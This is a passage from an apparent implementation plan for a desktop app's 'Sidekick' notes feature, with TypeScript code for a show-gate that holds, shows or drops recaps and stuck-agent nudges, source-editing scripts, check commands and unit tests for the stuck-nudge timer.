// A note that is refused for a reason that can pass (the user is away, a card is in front, they are typing, another note is up, one showed a minute ago) is kept for a while, 30 s for
// a nudge and 2 minutes for a recap, and shown if the gate opens; then it is dropped without a word. A note that is refused for a reason that will not pass soon (the switch is off, the
// kind is muted, the session had its nudge, this away period had its recap) is dropped at once. Nothing here polls and nothing here keeps a timer: the app tells it when the world may
// have changed (`retry`, `stateChanged`), and a held note's time is checked then. Pure: the clock and the island are given. Loaded by the plain-Node checks.

import { HOLD_MS, NUDGE_KINDS, shouldShow } from "./core.ts";
import type { NoteKind, ShowInput, SidekickSettings } from "./core.ts";

/** One note: what is said, and what it is about. It holds only what the contract's lines hold: an agent's name, a project's basename, counts, up to three file basenames. */
export interface Note {
  id: number;
  kind: NoteKind;
  /** The agent a nudge is about (the pill's ID); empty for a recap, which may be about several. */
  agentId: string;
  /** The session a nudge is about (the ledger's key); empty for a recap. */
  key: string;
  /** The words, one line each. A recap has up to three lines and "+N more"; a nudge has one. */
  lines: string[];
  /** The facts the lines were written from (the recap's `facts`, a nudge's agent and numbers): the only thing a local model may be given. */
  facts: unknown[];
  /** The moment the user left (a recap only). */
  awaySince: number | null;
}

/** What a caller offers: a note without its ID, which the notes give. */
export type NoteDraft = Omit<Note, "id">;

/** What the gate needs to know about the world, asked at the moment it decides. */
export interface World {
  /** The agent is rate-limited (the cat already shows it). */
  ratelimit(): boolean;
  /** An approval or a question is in front of the user. */
  card(): "approval" | "question" | null;
  /** The card of the request this nudge is about is on screen. */
  ownCard(): boolean;
  /** The user is typing in the island. */
  typing(): boolean;
  /** The user is away. */
  away(): boolean;
  /** This note is on screen now: the island is open on the Sidekick's view with it. */
  onScreen(id: number): boolean;
}

export interface NotesEnv {
  now(): number;
  settings(): SidekickSettings;
  world: World;
  /** The session of a nudge has had its nudge already. */
  nudged(key: string): boolean;
  /** Opens the island on the note, through the island's own peek. */
  present(note: Note): void;
  /** A note was shown: a nudge's session is marked as nudged. */
  shown(note: Note): void;
  /** A held note ran out of time and was dropped. */
  dropped(note: Note): void;
  /** One more dismissal of a kind (a click on Not now, OK or ×). */
  dismissed(kind: NoteKind): void;
}

/** The refusals that can pass: the note is kept, up to `HOLD_MS`. */
const HOLDABLE = new Set(["away", "ratelimit", "card", "typing", "busy", "recent"]);

const holdFor = (note: { kind: NoteKind }): number => (note.kind === "recap" ? HOLD_MS.recap : HOLD_MS.nudge);
/** A recap first, then the nudges in the contract's order. */
const rank = (note: { kind: NoteKind }): number => (note.kind === "recap" ? -1 : NUDGE_KINDS.indexOf(note.kind));

export class Notes {
  private readonly env: NotesEnv;
  private seq = 0;
  private held: { note: Note; since: number }[] = [];
  private visible: { note: Note; seen: boolean } | null = null;
  private lastShownAt: number | null = null;
  private lastRecapFor: number | null = null;
  private presenting = false;

  constructor(env: NotesEnv) {
    this.env = env;
  }

  /** The note on screen, if one is. */
  get current(): Note | null {
    return this.visible?.note ?? null;
  }

  /** Notes waiting for the gate. */
  get waiting(): readonly Note[] {
    return this.held.map((h) => h.note);
  }

  /** A note is offered. It shows now, is kept for a while, or is dropped; the answer is the gate's reason. */
  offer(draft: NoteDraft): string {
    const note: Note = { ...draft, id: ++this.seq };
    const g = this.gate(note);
    if (g.show) {
      this.show(note);
      return "ok";
    }
    if (HOLDABLE.has(g.reason) && !this.held.some((h) => h.note.kind === note.kind && h.note.key === note.key)) this.held.push({ note, since: this.env.now() });
    return g.reason;
  }

  /** The world may have changed (a card hid, the user came back, the switch changed): held notes that ran out of time go, and the first that may show does. */
  retry(): void {
    const now = this.env.now();
    this.held = this.held.filter((h) => {
      if (now - h.since <= holdFor(h.note)) return true;
      this.env.dropped(h.note);
      return false;
    });
    for (const h of [...this.held].sort((a, b) => rank(a.note) - rank(b.note))) {
      if (!this.gate(h.note).show) continue;
      this.held = this.held.filter((x) => x !== h);
      this.show(h.note);
      return;
    }
  }

  /** The app's state changed. A note that was on screen and is not now was folded away unseen: that is no dismissal. Held notes get another look. */
  stateChanged(): void {
    if (this.presenting) return;
    if (this.visible && !this.env.world.onScreen(this.visible.note.id)) this.visible = null;
    if (this.held.length) this.retry();
  }

  /** A click on Not now, OK or ×: one more dismissal of the note's kind, and the note is gone. */
  dismiss(): void {
    const v = this.visible;
    if (!v) return;
    this.visible = null;
    this.env.dismissed(v.note.kind);
    this.retry();
  }

  /** The pointer is over the island while the note is up: it has been seen, and a recap no longer replaces it. */
  hovered(): void {
    if (this.visible) this.visible.seen = true;
  }

  /** The switch went off: nothing is waiting any more. */
  clear(): void {
    this.held = [];
  }

  private gate(note: Note) {
    const s = this.env.settings(), w = this.env.world, now = this.env.now();
    const input: ShowInput = {
      on: s.on, kind: note.kind, dismissals: s.dismissals, away: w.away(), ratelimit: w.ratelimit(), card: w.card(), ownCard: w.ownCard(), inputFocused: w.typing(),
      visible: this.visible ? { kind: this.visible.note.kind, seen: this.visible.seen } : null, lastShownAt: this.lastShownAt, now,
      nudged: note.key !== "" && this.env.nudged(note.key), recapGiven: note.kind === "recap" && note.awaySince !== null && note.awaySince === this.lastRecapFor,
    };
    return shouldShow(input);
  }

  private show(note: Note): void {
    this.visible = { note, seen: false };
    this.lastShownAt = this.env.now();
    if (note.kind === "recap") this.lastRecapFor = note.awaySince;
    this.presenting = true;
    try {
      this.env.shown(note);
      this.env.present(note);
    } finally {
      this.presenting = false;
    }
  }
}
EOF
```

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/world.ts <<'EOF'
// What the show gate asks of the island, read from the app's state (sub-project F1, spec "The show gate" and "Where it shows"). A note shows only in a quiet moment: no approval or
// question in front, nothing the user is in the middle of. The island is "in the middle of something" when it is open on any view but the overview, the empty one and the cards of a
// finished task (a note waits for the gate; it never opens over the user's other work). Pure: the parts of the state it reads are a parameter. Loaded by the plain-Node checks.

import type { World } from "./notes.ts";

/** The views a note may replace: the island is open on them only to be looked at, never to be worked in. */
export const QUIET_VIEWS: ReadonlySet<string> = new Set(["overview", "empty", "finished", "sidekick"]);

/** The part of the app's state that the gate reads. */
export interface WorldState {
  mode: string;
  view: string;
  pendingApproval: unknown | null;
  chatApprovals: { length: number };
  tasks: readonly { state: string }[];
  /** The ID of the note the Sidekick's view shows, or null. */
  sidekickNoteId: number | null;
}

/** The island's side of the gate. `away` is the Sidekick's own and is not here. The parts are read when asked, never kept. */
export function worldOf(read: () => WorldState): Omit<World, "away"> {
  return {
    ratelimit: () => read().tasks.some((t) => t.state === "ratelimit"),
    card: () => {
      const s = read();
      return s.pendingApproval !== null || s.chatApprovals.length > 0 ? "approval" : s.mode === "expanded" && s.view === "question" ? "question" : null;
    },
    ownCard: () => {
      const s = read();
      return s.mode === "expanded" && s.view === "approval" && s.pendingApproval !== null;
    },
    typing: () => {
      const s = read();
      return s.mode === "expanded" && !QUIET_VIEWS.has(s.view);
    },
    onScreen: (id) => {
      const s = read();
      return s.mode === "expanded" && s.view === "sidekick" && s.sidekickNoteId === id;
    },
  };
}
EOF
```

- [ ] **Step 3: Compose them in the Sidekick, add the view and the actions**

The Sidekick builds its `Notes` from the env, listens for a return (`onReturn`) to offer a recap, and stores a click as a dismissal through `saveSettings`. The view is the finished task's card: a "who" row, the words, one or two buttons and a small × (the overview's own `jump` button class). Its height grows by 30 px per extra line (`sidekickHeight`: a recap has up to three lines and "+N more"). `Skew` is a number that is always 0 in the app: only Task 7's dev runs move it.

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/controller.ts", r'''import { SessionLedger } from "./ledger.ts";
import { Presence } from "./presence.ts";
import type { Return } from "./presence.ts";
import type { Platform } from "./core.ts";
''', r'''import { SessionLedger } from "./ledger.ts";
import { Notes } from "./notes.ts";
import type { Note, World } from "./notes.ts";
import { Presence } from "./presence.ts";
import type { Return } from "./presence.ts";
import { recapOf } from "./core.ts";
import type { NoteKind, Platform, SidekickSettings } from "./core.ts";
import { withDismissed } from "./settings.ts";
''')
edit("windows/src/sidekick/controller.ts", r'''  idleSeconds(): Promise<number | null>;
}
''', r'''  idleSeconds(): Promise<number | null>;
  /** The Sidekick settings as stored, clean: asked at the moment of every decision, so a change in Settings counts at once. */
  settings(): SidekickSettings;
  /** Stores new Sidekick settings (the dismissal counts changed). */
  saveSettings(next: SidekickSettings): void;
  /** What the gate asks of the island: whether a card is in front, whether the user is typing, whether a note is on screen. */
  world: Omit<World, "away">;
  /** Opens the island on a note, through the island's own peek (the view the finished task uses). */
  present(note: Note): void;
}
''')
edit("windows/src/sidekick/controller.ts", r'''  readonly onReturn: Array<(r: Return) => void> = [];
  private readonly env: SidekickEnv;
''', r'''  readonly onReturn: Array<(r: Return) => void> = [];
  /** The recaps and nudges waiting for the gate or on screen. */
  readonly notes: Notes;
  private readonly env: SidekickEnv;
''')
edit("windows/src/sidekick/controller.ts", r'''  constructor(env: SidekickEnv) {
    this.env = env;
  }
''', r'''  constructor(env: SidekickEnv) {
    this.env = env;
    this.notes = new Notes({
      now: () => env.now(),
      settings: () => env.settings(),
      world: { ...env.world, away: () => this.presence.away },
      nudged: (key) => this.ledger.snapshot.sessions.some((s) => s.key === key && s.nudgedAt !== null),
      present: (note) => env.present(note),
      shown: (note) => {
        if (note.kind !== "recap") this.ledger.markNudged(note.key, env.now());
      },
      dropped: () => {
        // A nudge that waited and ran out of time was never given: it counts as given only once it was shown, so its session may be nudged again.
      },
      dismissed: (kind) => this.dismissed(kind),
    });
    this.onReturn.push((r) => this.recap(r));
  }
''')
edit("windows/src/sidekick/controller.ts", r'''  private back(r: Return): void {
''', r'''  /** The user came back: if an agent did something while they were away, a recap is offered to the gate. */
  private recap(r: Return): void {
    const now = this.env.now();
    const recap = recapOf({ awaySince: r.awaySince, now, sessions: this.ledger.snapshot.sessions });
    if (!recap) return;
    this.notes.offer({ kind: "recap", agentId: "", key: "", lines: recap.lines.map((l) => (/^\+\d+ more$/.test(l) ? "…" : l)), facts: recap.facts, awaySince: r.awaySince });
  }

  private dismissed(kind: NoteKind): void {
    this.env.saveSettings(withDismissed(this.env.settings(), kind));
  }

  /** A click on Not now, OK or × on the note on screen. Folding the island, or a note timing out, is not one. */
  noteDismissed(): void {
    this.notes.dismiss();
  }

  /** The pointer is over the island while a note is up. */
  noteHovered(): void {
    this.notes.hovered();
  }

  /** The app's state changed (the island's `State.notify`): held notes get another look, and a note folded away unseen is forgotten. Cheap when nothing is held or shown. */
  stateChanged(): void {
    try {
      this.notes.stateChanged();
    } catch {
      // The sidekick never breaks the island.
    }
  }

  /** The Sidekick settings changed in Settings (a switch, an Unmute): the gate looks again. */
  settingsChanged(): void {
    if (this.env.settings().on === false) this.notes.clear();
    this.stateChanged();
  }

  private back(r: Return): void {
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

# ── State: the note on screen ──
edit("windows/src/core/state.ts", r'''import { cleanSidekickSettings } from "../sidekick/core.ts";
import type { SidekickSettings } from "../sidekick/core.ts";
''', r'''import { cleanSidekickSettings } from "../sidekick/core.ts";
import type { SidekickSettings } from "../sidekick/core.ts";
import type { Note } from "../sidekick/notes.ts";
''')
edit("windows/src/core/state.ts", r'''  pendingApproval: ApprovalInfo | null = null;

  /** Claude Code: the session ids''', r'''  pendingApproval: ApprovalInfo | null = null;
  /** The Sidekick's note, for the island's `sidekick` view (sub-project F1): a recap or a nudge. Set by the Sidekick when the gate lets it show; the view keeps showing it until the island moves on. */
  sidekickNote: Note | null = null;

  /** Claude Code: the session ids''')

# ── Layout: the view, and its height ──
edit("windows/src/core/layout.ts", r'''  | "note"
  | "settings"
  | "greeting";
''', r'''  | "note"
  | "settings"
  | "greeting"
  | "sidekick";
''')
edit("windows/src/core/layout.ts", r'''  greeting: { height: 150, botX: 320, botY: 90, botDiameter: 0, agentMode: "none" },
};
''', r'''  greeting: { height: 150, botX: 320, botY: 90, botDiameter: 0, agentMode: "none" },
  // The Sidekick's note (sub-project F1): a recap or a nudge, laid out as a finished task's card. Its height grows with its lines (`sidekickHeight`).
  sidekick: { height: 160, botX: 62, botY: null, botDiameter: 56, agentMode: "column" },
};
''')
edit("windows/src/core/layout.ts", r'''export function islandSize(
  mode: IslandMode,
  view: IslandViewName,
  chatCount = 0,
): { w: number; h: number } {''', r'''/** The Sidekick's view grows by one more line of text per line of the note, up to a recap's three lines and "+N more". */
export function sidekickHeight(lines: number): number {
  return Math.min(280, 160 + 30 * Math.max(0, Math.floor(lines) - 1));
}

export function islandSize(
  mode: IslandMode,
  view: IslandViewName,
  chatCount = 0,
  noteLines = 1,
): { w: number; h: number } {''')
edit("windows/src/core/layout.ts", r'''      const h = view === "prompt" ? chatPromptHeight(chatCount) : VIEW_LAYOUTS[view].height;''', r'''      const h = view === "prompt" ? chatPromptHeight(chatCount) : view === "sidekick" ? sidekickHeight(noteLines) : VIEW_LAYOUTS[view].height;''')
edit("windows/src/island/island.ts", r'''    const { w, h } = islandSize(State.mode, State.view, State.chatHistory.length);''', r'''    const { w, h } = islandSize(State.mode, State.view, State.chatHistory.length, State.sidekickNote?.lines.length ?? 1);''')

# ── The view ──
edit("windows/src/views/views.ts", r'''  openTerminal(): void;
''', r'''  openTerminal(): void;
  /** The Sidekick's note: a click on OK, Not now or × (one more dismissal of its kind), and "Open terminal" on a nudge (not a dismissal). */
  sidekickDismiss(): void;
  sidekickOpen(): void;
''')
edit("windows/src/views/views.ts", r'''// ── Confused ──────────────────────────────────────────────────────────────────
''', r'''// ── The Sidekick's note ───────────────────────────────────────────────────────

/** A recap ("Welcome back": what the agents did while you were away) or a nudge ("needs a look": one agent looks stuck). Built from the finished task's card. */
function buildSidekick(actions: ViewActions): ViewHost {
  const who = h("div");
  const lines = h("div", { class: "sk-lines" });
  const row = h("div", { class: "actions" });
  const close = h("button", { class: "icon-btn jump", title: "Dismiss", onclick: () => actions.sidekickDismiss() }, svg(ICONS.xmark, 8));
  const el = h("div", { class: "view" }, card("soft", stack(116, 28, who, lines, row)), close);
  let rowFor = -1;
  let wordsFor = "";
  return {
    el,
    sync() {
      const note = State.sidekickNote;
      if (!note) return;
      // The words can change under a note (a local model's nicer sentence, the waiting nudge at the give-up): the lines are rebuilt. The buttons are built once per note,
      // because rebuilding them between a mouse-down and a mouse-up would swallow the click.
      const words = note.lines.join("\n");
      if (words !== wordsFor || rowFor !== note.id) {
        wordsFor = words;
        clear(lines);
        note.lines.forEach((l, i) => lines.append(h("div", { class: note.kind === "recap" ? "sub sk-line" : i === 0 ? "title" : "sub", text: l })));
      }
      if (rowFor === note.id) return;
      rowFor = note.id;
      clear(who);
      clear(row);
      const task = note.agentId ? State.tasks.find((t) => t.id === note.agentId) ?? null : null;
      who.append(agentWho(task, note.kind === "recap" ? "Welcome back" : "needs a look"));
      if (note.kind === "recap") row.append(btn("OK", "primary", () => actions.sidekickDismiss()));
      else row.append(btn("Not now", "secondary", () => actions.sidekickDismiss()), btn("Open terminal", "primary", () => actions.sidekickOpen()));
    },
  };
}

// ── Confused ──────────────────────────────────────────────────────────────────
''')
edit("windows/src/views/views.ts", r'''  map.set("confused", buildConfused());
''', r'''  map.set("confused", buildConfused());
  map.set("sidekick", buildSidekick(actions));
''')

# ── The island: its actions, the hover ──
edit("windows/src/island/island.ts", r'''      openSettingsWindow: () => void Bridge.openSettingsWindow(),
      blip: () => Sound.play("blip"),''', r'''      sidekickDismiss: () => {
        Hub.sk?.noteDismissed();
        this.collapse();
      },
      sidekickOpen: () => {
        const id = State.sidekickNote?.agentId;
        void Bridge.openInVSCode(State.tasks.find((t) => t.id === id)?.sessionCwd ?? null);
      },
      openSettingsWindow: () => void Bridge.openSettingsWindow(),
      blip: () => Sound.play("blip"),''')
edit("windows/src/island/island.ts", r'''    if (inIsland && !this.wasInIsland) {
      this.sleep.event("hover");
''', r'''    if (inIsland && !this.wasInIsland) {
      this.sleep.event("hover");
      Hub.sk?.noteHovered();
''')

# ── The Sidekick's env ──
edit("windows/src/sidekick/appenv.ts", r'''import { Bridge } from "../core/bridge";
import type { SidekickEnv } from "./controller.ts";
import { platformName } from "./platform.ts";

export function sidekickEnv(): SidekickEnv {
  return {
    now: () => Date.now(),
    platform: platformName(),
    idleSeconds: async () => (await Bridge.sidekickIdleSeconds()) ?? null,
  };
}
''', r'''import { Bridge } from "../core/bridge";
import { State } from "../core/state";
import type { Island } from "../island/island";
import { cleanSidekickSettings } from "./core.ts";
import type { SidekickEnv } from "./controller.ts";
import { platformName } from "./platform.ts";
import { worldOf } from "./world.ts";

export function sidekickEnv(island: Island): SidekickEnv {
  return {
    now: () => Date.now(),
    platform: platformName(),
    idleSeconds: async () => (await Bridge.sidekickIdleSeconds()) ?? null,
    settings: () => cleanSidekickSettings(State.settings.sidekick),
    saveSettings: (next) => {
      State.settings = { ...State.settings, sidekick: next };
      void Bridge.saveSettings(State.settings);
      State.notify();
    },
    world: worldOf(() => ({
      mode: State.mode, view: State.view, pendingApproval: State.pendingApproval, chatApprovals: State.chatApprovals, tasks: State.tasks, sidekickNoteId: State.sidekickNote?.id ?? null,
    })),
    // The island's own peek, the one a finished task uses: it opens on the note and folds again by itself, never pinned.
    present: (note) => {
      State.sidekickNote = note;
      island.alert("sidekick");
    },
  };
}
''')

# ── main.ts: the island is given, State changes and Settings changes reach the Sidekick ──
edit("windows/src/main.ts", r'''  Hub.sk = new Sidekick(sidekickEnv());
''', r'''  Hub.sk = new Sidekick(sidekickEnv(island));
  State.subscribe(() => Hub.sk?.stateChanged());
''')
edit("windows/src/main.ts", r'''    void refreshConfigured();
    desktop.settingsChanged();
''', r'''    void refreshConfigured();
    desktop.settingsChanged();
    Hub.sk?.settingsChanged();
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/appenv.ts", r'''export function sidekickEnv(island: Island): SidekickEnv {
  return {
    now: () => Date.now(),
''', r'''/** Milliseconds added to the clock. Always 0 in the app; the dev server's `window.__nm.skew(ms)` moves it, so that a recap after minutes away can be looked at in seconds. */
export const Skew = { ms: 0 };

export function sidekickEnv(island: Island): SidekickEnv {
  return {
    now: () => Date.now() + Skew.ms,
''')
PY
```

```bash
cat >> windows/src/style.css <<'EOF'

/* ── The Sidekick's note (sub-project F1): new class names only ─────────────────────────────────────────────────────────────────────────── */
.sk-lines {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.sk-line {
  font-size: 12.5px;
  line-height: 1.3;
}
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 51`, `ℹ pass 51`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 4: Look at a recap**

With the dev server up, call the Sidekick as the island would: lock, an agent works, five minutes pass (`Skew`), unlock. (Task 7 wraps this in `__nm.run.recap()`.)

```bash
( cd .claude/checkpoints/f1-tauri && cat > scn-recap.js <<'EOF'
(async () => {
  const nm = window.__nm; const { Skew } = await import('/src/sidekick/appenv.ts');
  const ev = (name, x = {}) => nm.hook({ hook_event_name: name, session_id: 's1', cwd: 'C:/work/app', ...x });
  nm.island.collapse();
  nm.sk.presenceSignal('lock');
  ev('PostToolUse', { tool_name: 'Edit', tool_input: { file_path: 'C:/work/app/a.ts' } });
  ev('PostToolUse', { tool_name: 'Edit', tool_input: { file_path: 'C:/work/app/b.ts' } });
  Skew.ms += 5 * 60000;
  ev('Stop');
  nm.sk.presenceSignal('unlock');
  await new Promise(r => setTimeout(r, 1200));
  return nm.State.view;
})()
EOF
playwright-cli -s=f1 goto "http://127.0.0.1:14711/" > /dev/null; sleep 4; playwright-cli -s=f1 resize 760 340 > /dev/null; playwright-cli -s=f1 eval "$(cat scn-recap.js)" | sed -n 2p; playwright-cli -s=f1 screenshot --filename=note-recap.png > /dev/null; echo note-recap.png )
```

Expected: `"sidekick"`, `note-recap.png`.

Say what you saw: the island open on a card with the cat at the left, the grey line **"Welcome back"**, the sentence **"While you were away, Claude Code in app ran 2 steps, edited a.ts and b.ts, and finished."** in the island's own text style, an **OK** button and a small ×; the island is not pinned, so it folds again by itself.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): the show gate, held notes, dismissals, the sidekick view and the recap

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 7: Stuck nudges: the one-shot clock, the four rules and the dev server's scripted runs

**Files:**
- Create: `windows/src/sidekick/stuckclock.ts`, `dev.ts`, `windows/scripts/sidekick-tests/stuck.test.mjs`, `dev.test.mjs`
- Modify: `windows/src/sidekick/notes.ts`, `controller.ts`, `appenv.ts`, `windows/src/main.ts`, `windows/scripts/sidekick-tests/notes.test.mjs`, `presence.test.mjs`, `ledger.test.mjs`

**Interfaces:**
- Consumes: Task 6's `Notes`, `Note`, `Sidekick.notes`; Task 5's `presenceSignal`; Task 1's `stuckStep`, `nudgeText`, `markNudged` (through the ledger), `STUCK`, `agentName`.
- Produces: `class StuckClock` (`arm(at | null)`, `stop()`, `armed`, `due`), `MAX_DELAY_MS`; `NotesEnv.valid(note)`, `updated(note)`, `Notes.reword(id, lines)`; `SidekickEnv.updated(note)`, `timer: {set, clear}`; `Sidekick.clock`, `evaluate()`; the dev server's `__nm.run.{recap, loop, errors, waiting, quiet, card, agents}` and `__nm.skew(ms)`.

**The clock is ONE one-shot timer** (the `SleepClock` idea of `island/sleep.ts`): set to the nearest deadline of the rules that wait, set again by every hook event, every presence change and every change of the card or the rate limit, and **not set at all while nothing is live, the user is away, an agent is rate-limited or the switch is off**. `stuck.loop` and `stuck.errors` need no timer: they are looked at when the event arrives. After a sleep the wake signal asks the rules again at once, because a one-shot timer does not fire while the machine sleeps. **The owner's answers:** a nudge that fell due while the user was away is **dropped, not saved** (on the return the rules are asked once with `away` off; the nudge they give is remembered by what it is about, the session's last event and pending request, and never shown; a new event is a new thing and lifts it); **a nudge counts as given only once it was shown**, so one that waited for the gate and ran out of its 30 s was never given and may come again for a new event. A nudge that waited for the gate is shown only if it is still true. The waiting nudge's words change in place at the give-up (110 s) and that is not a second nudge.

- [ ] **Step 1: Write the test**

It runs a Sidekick on a clock and a timer queue the test turns by hand: a loop, three errors, a request waiting a minute and the give-up change, a card that hides, quiet after 5 and 15 minutes, every event setting the clock again, away and rate limit and the switch, a held nudge that is no longer true, dismissals, the clock itself (the same deadline keeps the timer, `NaN` stops it, the longest delay), and pins that the controller asks for a timer in exactly one place.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/stuck.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { StuckClock, MAX_DELAY_MS } from "../../src/sidekick/stuckclock.ts";
import { STUCK, cleanSidekickSettings } from "../../src/sidekick/core.ts";
import { source } from "./util.mjs";

const T0 = 20_000_000;
const MIN = 60_000;

/** A Sidekick on a clock and a timer queue the test turns by hand; the world (a card, the rate limit) is set by hand too. */
function rig(platform = "windows", settings = {}) {
  const w = { t: T0, timers: new Map(), id: 1, sets: 0, card: null, ownCard: false, ratelimit: false, typing: false, onScreen: true, settings: cleanSidekickSettings(settings), presented: [], updated: [] };
  const sk = new Sidekick({
    now: () => w.t, platform, idleSeconds: async () => null,
    settings: () => w.settings, saveSettings: (s) => { w.settings = s; },
    world: { ratelimit: () => w.ratelimit, card: () => w.card, ownCard: () => w.ownCard, typing: () => w.typing, onScreen: () => w.onScreen },
    present: (n) => w.presented.push(n), updated: (n) => w.updated.push(n),
    timer: { set: (fn, ms) => { const id = w.id++; w.sets++; w.timers.set(id, { fn, at: w.t + ms }); return id; }, clear: (id) => { w.timers.delete(id); } },
  });
  const hook = (name, extra = {}) => sk.hook({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
  const tool = (cmd, name = "PostToolUse") => hook(name, { tool_name: "Bash", tool_input: { command: cmd } });
  const advance = (ms) => {
    const end = w.t + ms;
    for (;;) {
      const due = [...w.timers.entries()].filter(([, x]) => x.at <= end).sort((a, b) => a[1].at - b[1].at)[0];
      if (!due) break;
      w.t = due[1].at; w.timers.delete(due[0]); due[1].fn();
    }
    w.t = end;
  };
  return { w, sk, hook, tool, advance, texts: () => w.presented.map((n) => n.lines[0]) };
}

test("a loop: the same step four times, once per session, in the contract's words, with no timer of its own for it", () => {
  const { w, tool, advance, texts } = rig();
  for (let i = 0; i < 3; i++) { tool("npm test"); advance(5000); }
  assert.deepEqual(texts(), []);
  tool("npm test");
  assert.deepEqual(texts(), ["Claude Code has run the same step 4 times."]);
  assert.equal(w.presented[0].kind, "stuck.loop");
  advance(2 * MIN);
  for (let i = 0; i < 8; i++) { tool("npm test"); advance(1000); }
  assert.equal(texts().length, 1, "a session is nudged once");
});

test("three errors in a row, Claude Code only", () => {
  const { tool, advance, texts } = rig();
  for (let i = 0; i < 3; i++) { tool(`bad ${i}`, "PostToolUseFailure"); advance(2000); }
  assert.deepEqual(texts(), ["Claude Code hit 3 errors in a row."]);
  const other = rig();
  for (let i = 0; i < 3; i++) { other.sk.hook({ hook_event_name: "PostToolUseFailure", session_id: "g", nm_agent: "gemini", cwd: "C:\\w", tool_name: "run_shell_command", tool_input: { command: `x${i}` } }); other.advance(2000); }
  assert.deepEqual(other.texts(), [], "Gemini sends no failure event worth a nudge");
});

test("waiting for your OK: a minute after the request, if its card is not on screen; the words change in place at the give-up, not a second nudge", () => {
  const { w, hook, advance, texts } = rig("windows");
  hook("PermissionRequest", { tool_name: "Bash", tool_input: { command: "rm x" } });
  assert.ok(w.timers.size === 1, "one timer, for the nearest deadline");
  advance(59_000);
  assert.deepEqual(texts(), []);
  advance(1000);
  assert.deepEqual(texts(), ["Claude Code is still waiting for your OK."]);
  assert.equal(w.presented.length, 1);
  advance(49_000);
  assert.equal(w.updated.length, 0, "the app has not given up yet at 109 s");
  advance(1000);
  assert.equal(w.presented.length, 1, "no second nudge");
  assert.deepEqual(w.updated.map((n) => n.lines[0]), ["Claude Code is waiting for your OK in the terminal."], "110 s on Windows: the same note, other words");
  assert.equal(w.updated[0].id, w.presented[0].id);
});

test("the Linux give-up is 110 s too, and a card on screen means no waiting nudge until the card hides", () => {
  assert.equal(STUCK.GIVE_UP_MS.linux, 110_000);
  const { w, sk, hook, advance, texts } = rig("linux");
  w.ownCard = true;
  hook("PermissionRequest", { tool_name: "Bash", tool_input: { command: "rm x" } });
  advance(5 * MIN);
  assert.deepEqual(texts(), [], "its own card is on screen");
  w.ownCard = false;
  sk.stateChanged();
  assert.deepEqual(texts(), ["Claude Code is waiting for your OK in the terminal."], "the card hid long after the give-up: the words are the later ones, once");
});

test("quiet: five minutes after a finished step, fifteen after a step that never ended; the clock is set to the deadline and fires once", () => {
  const { w, sk, tool, advance, texts } = rig();
  assert.equal(sk.clock.armed, false, "nothing live: no timer at all");
  tool("ls", "PostToolUse");
  assert.equal(sk.clock.armed, true);
  assert.equal(sk.clock.due, T0 + 5 * MIN);
  advance(5 * MIN - 1);
  assert.deepEqual(texts(), []);
  advance(1);
  assert.deepEqual(texts(), ["Claude Code has been quiet for 5 minutes."]);
  assert.equal(sk.clock.armed, false, "after the one nudge the session has nothing left to wait for");
  assert.equal(w.timers.size, 0);
  const b = rig();
  b.tool("long build", "PreToolUse");
  b.advance(14 * MIN);
  assert.deepEqual(b.texts(), []);
  b.advance(1 * MIN);
  assert.deepEqual(b.texts(), ["Claude Code has been quiet for 15 minutes."]);
});

test("every event sets the clock again to the new nearest deadline, and one timer is all there ever is", () => {
  const { w, sk, tool, advance } = rig();
  tool("ls");
  const first = sk.clock.due;
  advance(2 * MIN);
  tool("ls again");
  assert.equal(sk.clock.due, first + 2 * MIN, "pushed back by the new event");
  assert.equal(w.timers.size, 1);
  for (let i = 0; i < 30; i++) { advance(1000); tool(`step ${i}`); assert.ok(w.timers.size <= 1); }
});

test("away, a rate limit and the switch: no nudge and no clock; when they end the rules are asked again at once", () => {
  const { w, sk, tool, advance, texts } = rig();
  tool("ls");
  sk.presenceSignal("lock");
  assert.equal(sk.clock.armed, false, "away: no deadline");
  advance(10 * MIN);
  assert.deepEqual(texts(), []);
  sk.presenceSignal("unlock");
  assert.equal(w.presented[0].kind, "recap", "back: the recap comes first");
  assert.equal(sk.notes.waiting.length, 0, "the nudge that fell due while away is dropped, not saved for later");
  sk.noteDismissed();
  advance(10 * MIN);
  assert.equal(w.presented.length, 1, "and it does not come back");
  tool("ls again");
  advance(5 * MIN);
  assert.ok(texts().at(-1).startsWith("Claude Code has been quiet for"), "a new event is a new thing: its nudge is given as usual");
  const r = rig();
  r.tool("ls");
  r.w.ratelimit = true;
  r.sk.stateChanged();
  assert.equal(r.sk.clock.armed, false);
  r.advance(10 * MIN);
  assert.deepEqual(r.texts(), []);
  r.w.ratelimit = false;
  r.sk.stateChanged();
  assert.equal(r.texts().length, 1, "the rate limit ended: asked again");
  const off = rig("windows", { on: false });
  off.tool("ls");
  assert.equal(off.sk.clock.armed, false);
  off.advance(10 * MIN);
  assert.deepEqual(off.texts(), []);
